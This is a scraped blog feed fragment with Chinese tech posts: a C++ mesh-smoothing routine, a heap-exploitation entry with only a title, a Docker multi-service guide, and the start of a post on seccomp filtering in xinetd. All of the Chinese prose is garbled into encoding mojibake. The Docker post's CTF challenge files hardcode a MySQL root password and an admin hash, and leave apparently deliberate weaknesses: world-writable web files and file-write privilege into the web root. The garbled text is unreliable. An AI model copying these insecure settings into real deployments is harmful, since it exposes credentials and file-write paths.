class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:mesh_process()&#123;<span class="comment">///////(ÂèØÈÄâÔºåÂú®‰∏âËßíÁΩëÊ†º‰∏äÂÆûÁé∞‰∏ÄÁßçÊìç‰ΩúÔºå‰æãÂ¶ÇÁâπÂæÅÊèêÂèñÔºåÁΩëÊ†ºÂàÜÂâ≤Ôºå‰∏âËßíÁΩëÊ†ºÂèòÂΩ¢Á≠âÁ≠â)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input sharpening vertex update iterations(1-30Ê¨°): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Áî±‰∫éËø≠‰ª£ÔºåÊØîËæÉËÄóÊó∂ÔºÅ"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] -= coord(vertex_handle(hh))*j;</span><br><span class="line">      updateVertexPosition[i] *= <span class="number">-1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ += updateVertexPosition[i]*<span class="number">0.1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of sharpening vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊïàÊûúÂ¶Ç‰∏ãÔºö</p><p>ÂéüÂßãÂõæÂΩ¢<img src="https://qiniu.karlrixon.cn/blog/181029/D4LKhgkkdi.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/eE8bBdcl4L.png?imageslim" alt="mark"><br>ÂéªÂô™Âêé<img src="https://qiniu.karlrixon.cn/blog/181109/3b9c2im837.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/6ll9hEAIHb.png?imageslim" alt="mark"><br>ÂèòÂΩ¢Âêé<img src="https://qiniu.karlrixon.cn/blog/181109/f476cgEAhE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/74jl6gbh05.png?imageslim" alt="mark"></p><h2 id="ÊÄùË∑ØÊÄªÁªì-amp-ÈÅáÂà∞ÁöÑÈóÆÈ¢ò"><a href="#ÊÄùË∑ØÊÄªÁªì-amp-ÈÅáÂà∞ÁöÑÈóÆÈ¢ò" class="headerlink" title="ÊÄùË∑ØÊÄªÁªì&amp;ÈÅáÂà∞ÁöÑÈóÆÈ¢ò"></a>ÊÄùË∑ØÊÄªÁªì&amp;ÈÅáÂà∞ÁöÑÈóÆÈ¢ò</h2><p>task1‰∏≠Êµ∑‰º¶ÂÖ¨ÂºèÊ≥®ÊÑèpË°®Á§∫ÂçäÂë®Èïø</p><p>task2‰∏≠ÁöÑËÆ°ÁÆóÈ°∂ÁÇπÊ≥ïÂêëÁöÑÊÄùÊÉ≥ÊòØÂ∞ÜÁõ∏ÈÇªÁöÑÊâÄÊúâÈù¢ÁâáÊ≥ïÂêëÁõ∏Âä†</p><p>task3‰ΩøÁî®Èù¢ÁâáËø≠‰ª£Âô®ÔºåË∞ÉÁî®ÂáΩÊï∞ÁÆóÂá∫‰∏âËßíÂΩ¢‰∏≠ÂøÉÂíåÊ≥ïÂêëÔºå‰ΩøÁî® <code>glBegin(LINES)</code>ÁîªÁ∫ø</p><p>task4Ë¶ÅÈ¶ñÂÖàÁÆóÂá∫ÊâÄÊúâÁÇπÂú®‰∏ÄÁéØÈÇªÊé•È°∂ÁÇπ‰ΩúÁî®‰∏ãÁöÑÊ≠£Á°Æ‰ΩçÁΩÆÔºàÂç≥ÈÇªÊé•È°∂ÁÇπÁõ∏Âä†Èô§‰ª•ÈÇªÊé•È°∂ÁÇπ‰∏™Êï∞ÔºâÔºåÁÑ∂ÂêéÁªü‰∏Ä‰øÆÊîπmesh‰∏≠È°∂ÁÇπÊï∞ÊçÆ„ÄÇËøôÈáåÂ≠òÂÇ®ÊâÄÊúâÈ°∂ÁÇπÊñ∞‰ΩçÁΩÆÁî®Âà∞‰∫ÜÂÆπÂô®Ôºå‰ΩøÁî®Êó∂Ë¶ÅÊ≥®ÊÑèÂÖàÁªôÂÆπÂô®ÂàÜÈÖçÁ©∫Èó¥ÔºåËÄå‰∏îÂÆπÂô®‰∏ãÊ†á‰ªé0ÂºÄÂßãÔºå‰∏çÁÑ∂‰ºöÊä•ÈîôÂÆπÂô®‰∏ãÊ†áË∂äÁïå</p><p>task5Âú®task4ÁöÑÂü∫Á°Ä‰∏ä‰ª•Âè¶‰∏ÄÁßçÊñπÊ≥ï‰øÆÊîπ‰∫ÜÈ°∂ÁÇπ‰ΩçÁΩÆÂÆûÁé∞‰∏ÄÁßçÊñ∞ÁöÑÁΩëÊ†ºÂèòÊç¢Êìç‰ΩúÂøÖË¶ÅÊó∂ÂèØ‰ª•Ëá™Â∑±ÂêëÂÜÖÊ†∏‰ª£Á†ÅÊ∑ªÂä†‰∏Ä‰∫õÂáΩÊï∞</p>]]></content>
        <author>
            <name><![CDATA[KarlRixon‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/</id>
        <title><![CDATA[Â†ÜÂà©Áî®ÂèòËøÅ Glibc<2.25]]></title>
        <updated>2018-10-25T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"/>
        <content type="text/html" src="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"><![CDATA[Â†ÜÂà©Áî®ÂèòËøÅ Glibc<2.25]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/</id>
        <title><![CDATA[Â¶Ç‰ΩïÁßëÂ≠¶ÁöÑÂú®Docker Container‰∏≠ËøêË°åÂ§ö‰∏™ÊúçÂä°]]></title>
        <updated>2018-08-25T13:29:15+08:00</updated>
        <link href="https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/"/>
        <content type="text/html" src="https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/"><![CDATA[<p>Âú®‰∏Ä‰∏™Docker Container‰∏≠ËøêË°åÂ§ö‰∏™ÊúçÂä°ÔºüÊâìÊâ∞‰∫Ü„ÄÇ</p>
<h1>0x00 ÂâçË®Ä</h1>
<p>DockerÔºåÊàñËØ¥‰ªª‰ΩïÂü∫‰∫é<code>ÂÜÖÊ†∏namespace</code>ÁöÑËΩªÈáèÁ∫ßËøõÁ®ãÈöîÁ¶ªÊäÄÊúØÔºåÂú®ËÆæËÆ°‰πãÂàùÔºåÈÉΩ‰∏çÊòØ‰∏∫‰∫ÜÂΩì‰ΩúËôöÊãüÊú∫‰ΩøÁî®ÁöÑ„ÄÇ‰πüÂ∞±ÊòØËØ¥ÔºåÂÖ∂‰∏≠ËøêË°åÁöÑÂπ∂‰∏çÊòØ‰∏Ä‰∏™ÂÆåÊï¥ÁöÑÊìç‰ΩúÁ≥ªÁªü„ÄÇÂåÖÊã¨DockerÂÆòÊñπÔºå‰πüÊòØÊé®ËçêÂú®‰∏Ä‰∏™ContainerÂÜÖ‰ªÖËøêË°å‰∏Ä‰∏™ÊúçÂä°„ÄÇÂ¶ÇÊûúÈúÄË¶ÅËøêË°åÂ§ö‰∏™ÊúçÂä°ÔºåÂ∫îÈÄöËøá<code>docker run --link</code> ÊàñËÄÖ<code>docker-compose</code>Êù•ÂÖ≥ËÅîÂ§ö‰∏™ÂÆπÂô®„ÄÇ‰ΩÜÊòØÂú®ÂÆûÈôÖÁöÑÂ∫îÁî®‰∏≠ÔºåÊàë‰ª¨ÁªèÂ∏∏Â∏åÊúõÂ∞Ü‰∏Ä‰∏™ÂÆåÊï¥ÁöÑÂèØËøêË°åÁéØÂ¢ÉÊâìÂåÖÊàê‰∏Ä‰∏™<code>docker image</code>Ôºå‰∏çÂÜç‰æùËµñÂÖ∂‰ªñÁöÑÂÆπÂô®„ÄÇÊØîÂ¶ÇÂú®CTFÊØîËµõ‰∏≠ÔºåÂ∞ÜÂ§ö‰∏™ÊúçÂä°ÊâìÂåÖÊàê‰∏Ä‰∏™ImageÔºåÂèØ‰ª•ÊúâÊïàÂú∞ÊèêÈ´òÂú®ÁéØÂ¢ÉÂèóÊçüÂêéÊÅ¢Â§çÁöÑÊïàÁéá„ÄÇÂú®ÁªèÂéÜ‰∫ÜÂ§öÂú∫ÊØîËµõÔºåÁúãËøáÂêÑÁßçÂ§ßÂ∏àÂÇÖÁî®ÂêÑÁßçÂ•áÊÄ™ÁöÑÂßøÂäøÂÆåÊàêËøô‰∏™‰ªªÂä°ÂêéÔºåËßâÂæóÂ∫îËØ•Â•ΩÂ•ΩÁöÑËÆ®ËÆ∫‰∏Ä‰∏ãËøô‰∏™ÈóÆÈ¢ò„ÄÇ</p>
<h1>0x01 ÈîôËØØÁöÑÂßøÂäø</h1>
<ol>
<li>‰ΩøÁî®upstartÁöÑÂêØÂä®ÊñπÂºè</li>
</ol>
<pre><code># Dockerfile
From ubuntu:14.04
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
ADD web /var/www/html
RUN service mysql start &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; service mysql stop
CMD service mysql start &amp;&amp; service apache2 start &amp;&amp; while true; do sleep 10;done
</code></pre>
<ol>
<li>‰ΩøÁî®systemdÁöÑÂêØÂä®ÊñπÂºè</li>
</ol>
<pre><code># Dockerfile
From ubuntu:16.04
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
ADD web /var/www/html
RUN systemctl start mysql &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; systemctl stop mysql
CMD systemctl start mysql &amp;&amp; systemctl start apache2 &amp;&amp; while true; do sleep 10;done
</code></pre>
<ol>
<li>‰ΩøÁî®ÂêØÂä®ËÑöÊú¨ÂêØÂä®Â§ö‰∏™ÊúçÂä°</li>
</ol>
<pre><code># Dockerfile
From ubuntu:16.04
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
ADD web /var/www/html
ADD entrypoint.sh /sbin/
RUN chmod +x /sbin/entrypoint.sh /var/www/html/init_sql.sh&amp;&amp; \
     /etc/init.d/mysql start &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; /etc/init.d/mysql stop
CMD /sbin/entrypoint.sh
</code></pre>
<pre><code>#!/bin/bash 

# entrypoint.sh
/usr/bin/mysqld start &amp;
/usr/bin/httpd &amp;
while true
do
sleep 100
done
</code></pre>
<p>Âú®ÂÆûÈôÖ‰∏≠Ôºå‰ΩøÁî®<code>ÊñπÊ≥ï1</code>ÊàñËÄÖ<code>ÊñπÊ≥ï2</code>ÂæàÂ§ßÂá†ÁéáÊó†Ê≥ïÂÆåÊàêÂ∞ÜÂ§ö‰∏™ÊúçÂä°Ë∑ëÂú®Âêå‰∏Ä‰∏™container‰∏≠ÁöÑ‰ªªÂä°„ÄÇ<code>ÊñπÊ≥ï3</code>ËôΩÁÑ∂ÂèØ‰ª•Ôºå‰ΩÜ‰ªçÁÑ∂Â≠òÂú®‰∏Ä‰∫õÈóÆÈ¢òÔºö</p>
<ol>
<li>‰∏ÄÊó¶‰∫ßÁîüÂÉµÂ∞∏ËøõÁ®ãÔºåÂ∞ÜÊó†‰∫∫ÂõûÊî∂ÔºåÂè™ÊúâÊùÄÊéâÊï¥‰∏™containerÊâçËÉΩËß£ÂÜ≥„ÄÇ</li>
<li>Âú®ÂÅúÊ≠¢containerÁöÑÊó∂ÂÄôÂ∞ÜÊó†‰∫∫Â§ÑÁêÜ<code>SIGTERM</code>Á≠â‰ø°Âè∑„ÄÇ</li>
<li>ÂæàÈöæÈáçÂêØÂÖ∂‰∏≠Êüê‰∏Ä‰∏™ÊúçÂä°</li>
</ol>
<p><code>ÊñπÊ≥ï1</code>Âíå<code>ÊñπÊ≥ï2</code>‰∏çËÉΩÊàêÂäüÔºåÊòØÂõ†‰∏∫dockerÂè™ÊòØ‰∏Ä‰∏™ËøõÁ®ãÈöîÁ¶ªÁöÑÊ≤ôÁÆ±ÁéØÂ¢ÉÔºåÂπ∂‰∏çÊòØÁúüÊ≠£ÁöÑËôöÊãüÊú∫„ÄÇËÄå<code>service xxx start</code> Âíå<code>systemctl start xxx</code> ÂàÜÂà´ÊòØ<code>upstart</code>Âíå<code>systemd</code>Ëøô‰∏§‰∏™<code>/sbin/init</code>ËøõÁ®ãÁöÑÊõø‰ª£ËÄÖÁöÑÊúçÂä°ÁÆ°ÁêÜÂëΩ‰ª§„ÄÇËÄå<code>upstart</code>Âíå<code>systemd</code>ÈÉΩË¶ÅÊ±ÇÁ≥ªÁªüÂøÖÈ°ªÊòØÁâ©ÁêÜÊú∫ÊàñËôöÊãüÊú∫ÔºåÂπ∂‰∏çÊîØÊåÅ‰Ωú‰∏∫containerÁöÑ<code>init</code>ËøõÁ®ã„ÄÇÊñπÊ≥ï3Â≠òÂú®ÈóÆÈ¢òÊòØÂõ†‰∏∫ÔºåÂú®Ê≠£Â∏∏ÁöÑÁ≥ªÁªü‰∏≠Ôºå<code>init</code>ËøõÁ®ãÊ∞∏ËøúÂç†Áî®<code>PID=1</code>ÁöÑ‰ΩçÁΩÆÔºåÂõûÊî∂ÂÉµÂ∞∏ËøõÁ®ã„ÄÅÂ§ÑÁêÜÊú™Â§ÑÁêÜÁöÑ‰ø°Âè∑Á≠âÈÉΩÊòØÁî±<code>init</code>ËøõÁ®ãÂ∏ÆÊàë‰ª¨ÂÆåÊàêÁöÑÔºå‰∏Ä‰∏™Â≠êËøõÁ®ãÂ¶ÇÊûúÂ§±Âéª‰∫ÜÁà∂ËøõÁ®ãÔºå‰πü‰ºöÁî±<code>init</code>ËøõÁ®ãÊé•ÁÆ°„ÄÇ‰ΩÜÊòØÂú®container‰∏≠Ôºå<code>init</code>ËøõÁ®ãÂπ∂‰∏çÂ≠òÂú®Ôºå<code>PID=1</code>ÁöÑËøõÁ®ãÊòØÊàë‰ª¨Âú®<code>Dockerfile</code>‰∏≠ÂÆö‰πâÁöÑ<code>Entrypoint</code>ÊàñÊúÄÂêé‰∏Ä‰∏™<code>CMD</code>ÊåáÂÆöÁöÑÂëΩ‰ª§„ÄÇ</p>
<pre><code>root@vpscn:/var/lib/docker# docker exec -it hackmd sh
/hackmd # ps -ef
PID   USER     TIME   COMMAND
    1 hackmd     1:03 node app.js
   42 hackmd     0:00 /usr/local/bin/node ./lib/workers/dmpWorker.js
   62 root       0:00 sh
   69 root       0:00 ps -ef
</code></pre>
<p>Âõ†Ê≠§ÔºåÂØπ‰∫éÂêØÂä®ÊñπÊ≥ï3ÁöÑcontainerÔºåÊàë‰ª¨Â∫îËØ•Âú®ÂêØÂä®Êó∂Âä†‰∏ä<code>--init</code>ÂèÇÊï∞ÔºåÊù•Âº∫Âà∂‰ΩøÁî®<a href="https://github.com/krallin/tini">tini</a>‰Ωú‰∏∫<code>init</code>ËøõÁ®ã„ÄÇ‰ΩÜÊòØÂ∞±ÁÆóËøôÊ†∑ÔºåÂú®ÊúçÂä°Â§ö‰∫Ü‰πãÂêéÔºåËøõË°åÈáçÂêØÁ≠âÊìç‰Ωú‰ªçÁÑ∂ÂæàÁπÅÁêê„ÄÇ</p>
<h1>0x02 Êé®ËçêÁöÑÂßøÂäø</h1>
<p>‰Ωú‰∏∫‰∏Ä‰∏™~~ÈáëÁâåËøêÁª¥~~ÊâìÊùÇÁöÑÔºåÁÆÄÂçïË∞àË∞àÊàëÂ∏∏Áî®ÁöÑÊñπÊ≥ï„ÄÇ</p>
<p>È¶ñÂÖàÊé®Ëçê‰∏Ä‰∏™Ë∂ÖÁ∫ßÂ•ΩÁî®ÁöÑÂü∫Á°ÄÈïúÂÉè<code>phusion/baseimage</code>„ÄÇÊà™Ëá≥SUCTF2018ÁéØÂ¢ÉÂáÜÂ§áÂÆåÊàêÊó∂ÔºåËØ•ÈïúÂÉèÁöÑÊúÄÊñ∞ÁâàÊú¨ÊòØ<code>0.10.1</code>ÔºåÂü∫‰∫é<code>ubuntu 16.04</code>„ÄÇÊàë‰ª¨Â∏∏Áî®ÁöÑ<code>apt-get</code>Á≠âÂëΩ‰ª§ÈÉΩÂèØ‰ª•Êó†ÁºùÂÖºÂÆπ„ÄÇ<a href="https://github.com/phusion/baseimage-docker">phusion/baseimage</a> ÈááÁî®‰∫Ü‰ΩúËÄÖËá™Â∑±ÂºÄÂèëÁöÑ‰∏Ä‰∏™Âü∫‰∫é<code>python</code>ÁöÑ<code>init</code>ËøõÁ®ã‰Ωú‰∏∫ContainerÁöÑ<code>Entrypoint</code>ÔºåÈááÁî®<code>runit</code>‰Ωú‰∏∫ÊúçÂä°ÁÆ°ÁêÜÂô®„ÄÇËøô‰∏™Âü∫Á°ÄÈïúÂÉèËøòÊòØÂú®CodingÊâìÊùÇÁöÑÊó∂ÂÄôÁü•ÈÅìÁöÑÔºå<a href="https://studio.coding.net">Coding ~~WebIDE~~ Studio</a> ÁöÑWeb Terminal‰πüÊòØÂü∫‰∫éËøô‰∏™ÈïúÂÉèÂÅöÁöÑ„ÄÇNUAACTF/SUCTFÁöÑPWNÈ¢òÂü∫Á°ÄÈïúÂÉè<a href="https://github.com/Asuri-Team/ctf-xinetd">ctf-xinetd</a>‰πüÊòØÂü∫‰∫éËøô‰∏™ÈïúÂÉèÂÅöÁöÑ„ÄÇ</p>
<p>ÁÑ∂ÂêéÁõ¥Êé•Ë¥¥‰∏™Âú®SUCTF2018ËøêÁª¥ÊúüÈó¥ÂÜôÁöÑ<code>Dockerfile</code></p>
<pre><code>#Dockerfile
FROM phusion/baseimage:0.10.1
MAINTAINER Yibai Zhang &lt;xm1994@outlook.com&gt;

RUN sed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list &amp;&amp;\
    sed -i 's/security.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list &amp;&amp;\
    apt-get update &amp;&amp; apt-get install -y apache2 libapache2-mod-php php-mysql mariadb-server &amp;&amp;\
    apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/* /var/www/html/*

RUN mkdir -p /etc/service/apache2/ &amp;&amp; \
    printf "#!/bin/sh\n\ntrap \"apachectl -k graceful-stop\" 1 2 3 6 15\n\nexec /usr/sbin/apachectl -D FOREGROUND\n" &gt; /etc/service/apache2/run &amp;&amp;\
    chmod +x /etc/service/apache2/run &amp;&amp; mkdir -p /etc/service/mysql/ &amp;&amp;\
    printf "#!/bin/sh\n\ntrap \"mysqladmin -uroot -psuCTF_P1us_1s shutdown\" 1 2 3 6 15\n\nexec /usr/bin/mysqld_safe" &gt; /etc/service/mysql/run &amp;&amp;\
    mkdir -p /var/run/mysqld/ &amp;&amp; chown mysql:mysql /var/run/mysqld &amp;&amp;\
    chmod 700 /etc/service/mysql/run /etc/service/apache2/run

COPY web /var/www/html
COPY flag /flag
RUN echo "secure-file-priv=/var/www/" &gt;&gt;/etc/mysql/mariadb.conf.d/50-server.cnf &amp;&amp; chmod -R 777 /var/www/html/favicon
COPY init_sql.sh /tmp/init_sql.sh
RUN chmod +x /tmp/init_sql.sh &amp;&amp; bash -c "/tmp/init_sql.sh" &amp;&amp; rm /tmp/init_sql.sh
EXPOSE 80
</code></pre>
<pre><code>#!/usr/bin/env bash
#init_sql.sh

mysqld_safe &amp;   
echo -n "Waiting for mysql startup"
while ! mysqladmin --host="localhost" --silent ping ; do
    echo -n "."
    sleep 1
done
echo

mysql -uroot &lt;&lt;EOF
UPDATE mysql.user SET Password=PASSWORD('XXXXXX'), plugin = '' WHERE User='root';
create database calc;
use calc;
create table user(
id INT NOT NULL AUTO_INCREMENT primary key,
username varchar(32) NOT NULL,
password varchar(32) NOT NULL
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
insert into user values(1,'admin','aa67095d8e65d624548cb6b50bd4778e');
create table file(
id INT NOT NULL AUTO_INCREMENT primary key,
filename varchar(32) NOT NULL,
filehash varchar(32) NOT NULL,
sig varchar(120) NOT NULL
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
create table flag(
flag varchar(120) primary key
)ENGINE=InnoDB DEFAULT CHARSET=utf8;
insert into flag values('SUCTF{a_very_long_long_long_long_long_fake_flag_d}');
grant SELECT, INSERT on calc.user to 'suctf'@localhost identified by 'suctf';
grant SELECT, INSERT, UPDATE on calc.file to 'suctf'@localhost ;
grant SELECT on calc.flag to 'suctf'@localhost ;
FLUSH PRIVILEGES;
EOF

mysqladmin -uroot -pXXXXXX shutdown
</code></pre>
<p>ËøôÈáåÁùÄÈáçÁúã‰∏Ä‰∏ã<code>printf "#!/bin/sh\n\ntrap \"apachectl -k graceful-stop\" 1 2 3 6 15\n\nexec /usr/sbin/apachectl -D FOREGROUND\n" &gt; /etc/service/apache2/run</code>ÔºåËøô‰∏™ÂëΩ‰ª§Â∞±ÊòØÂú®ÂàõÂª∫runitÂêØÂä®ËÑöÊú¨„ÄÇÂÖ∑‰ΩìÁöÑËØ¥ÊòéÂèØ‰ª•ÂéªÁúã<code>phusion/baseimage</code>ÊàñËÄÖ<code>runit</code>ÁöÑÊâãÂÜå„ÄÇÊâßË°åÂÆåÊàêÂêé‰ºöÂú®<code>/etc/service/apache2/run</code>‰∏ãÈù¢ÁîüÊàêÂ¶Ç‰∏ãÂÜÖÂÆπÁöÑËÑöÊú¨</p>
<pre><code>#!/bin/sh

trap "apachectl -k graceful-stop" 1 2 3 6 15

exec /usr/sbin/apachectl -D FOREGROUND
</code></pre>
<p>Ëøô‰∏™ËÑöÊú¨‰ºö‰Ωú‰∏∫runitÁöÑÂ≠êËøõÁ®ãËøêË°åÔºåÂπ∂Â∞ÜApache2‰øùÊåÅÂú®ÂâçÂè∞ËøêË°å„ÄÇÂú®Êé•Êî∂Âà∞<code>1 2 3 6 15</code>ËøôÂá†‰∏™‰ø°Âè∑ÁöÑÊó∂ÂÄôÂèãÂ•ΩÁöÑ(graceful)ÁªìÊùüApache2„ÄÇÂ¶ÇÊûúÂú®ËøêË°å‰∏≠ÈúÄË¶ÅÈáçÂêØApacheÊúçÂä°ÔºåÂè™ÈúÄË¶ÅËøêË°å<code>docker exec container_name sv restart apache2</code>Âç≥ÂèØ„ÄÇÈÄöËøáËøôÁßçÊñπÂºèÔºåÂú®ContainerÂÅúÊ≠¢ÁöÑÊó∂ÂÄô‰πüÂèØ‰ª•ÈÄöÁü•Áõ∏ÂÖ≥ÁöÑËøõÁ®ãÔºåËÄå‰∏çÊòØÁõ¥Êé•ÂÖ®ÈÉ®ÊùÄÊ≠ªÔºåÊõ¥ÂèØ‰ª•‰øùËØÅÊúçÂä°ÁöÑÂÆåÊï¥ÊÄß„ÄÇ~~ËôΩÁÑ∂Âú®ÊØîËµõ‰∏≠Âü∫Êú¨ÊåÇ‰∫ÜÂ∞±Ë¶ÅÊÅ¢Â§çÁéØÂ¢ÉÊ†πÊú¨‰∏çÈúÄË¶Å‰øùËØÅÂÆåÊï¥ÊÄß„ÄÇ~~</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2018/05/xinetd-kafel/</id>
        <title><![CDATA[xinetd-kafel ‚Äì ‰∏Ä‰∏™Êõ¥ÂÆâÂÖ®ÁöÑxinetdÊúçÂä°]]></title>
        <updated>2018-05-12T13:26:27+08:00</updated>
        <link href="https://www.summershrimp.com/2018/05/xinetd-kafel/"/>
        <content type="text/html" src="https://www.summershrimp.com/2018/05/xinetd-kafel/"><![CDATA[<p>‰∏∫‰∫Ü‰øùËØÅCTFËß£È¢ò/Ê∏óÈÄèËµõ‰∏≠PWNÊúçÂä°ÊúâÊõ¥Á®≥ÂÆöÁöÑË°®Áé∞ÔºàÈ¢ÑÈò≤ÊêÖÂ±éÊ£çÔºâÂíåCTFÊîªÈò≤Ëµõ‰∏≠Êúâ‰∫∫‰ΩøÁî®ptrace/seccompÁ≠âÁ≥ªÁªüË∞ÉÁî®ÂÅöÈÄöÁî®Èò≤Âæ°ÔºåÊàëÂú®xinetd‰∏≠Âä†ÂÖ•‰∫ÜÂØπsyscallÁöÑËøáÊª§„ÄÇÊÑüË∞¢GoogleÁöÑKafelÈ°πÁõÆÔºåÁªôÁºñÂÜôseccomp bpf‰ª£Á†ÅÊèê‰æõ‰∫Ü‰∏ÄÁßçÊõ¥Êñπ‰æøÁöÑÊñπÊ≥ï„ÄÇ</p>
<h1>0x00 ÂâçË®ÄÔºö‰∏∫Âï•Ë¶ÅÊêûËøô‰∏™‰∏úË•øÔºü</h1>
<p>‰ºóÊâÄÂë®Áü•ÔºåÂú®CTFÁ∫ø‰∏ãËµõ‰∏≠ÔºåÂêÑÂ§ß‰∏ªÂäûÊñπÊòé‰ª§Á¶ÅÊ≠¢‰ΩøÁî®ÈÄöÁî®Èò≤Âæ°ËΩØ‰ª∂/ËßÑÂàôÂØπËµõÈ¢òËøõË°åÈò≤Âæ°„ÄÇ‰ΩÜÊòØÁõÆÂâçÂú®ÂõΩÂÜÖÂ§ñÁöÑÂêÑÂ§ßÊØîËµõ‰∏≠ÔºåPWNÈ¢òÁõÆÂ§öÁî®socatÊàñxinetdÊèê‰æõÊúçÂä°„ÄÇËÄåËøô‰∏§‰∏™ÁªÑÂª∫ÈÉΩÂ§™ËøáÁÆÄÈôãÔºåÊó†Ê≥ïÊèê‰æõÁ≤æÁªÜÁöÑÁ≥ªÁªüË∞ÉÁî®ÊéßÂà∂Ôºå‰∏ªÂäûÊñπÂØπÈÄöÈò≤Â∑•ÂÖ∑ÁöÑÊ£ÄÊü•Â§ö‰∏∫‰∫∫Â∑•ÁôªÈôÜgameboxÊ£ÄÊü•„ÄÇ<br />
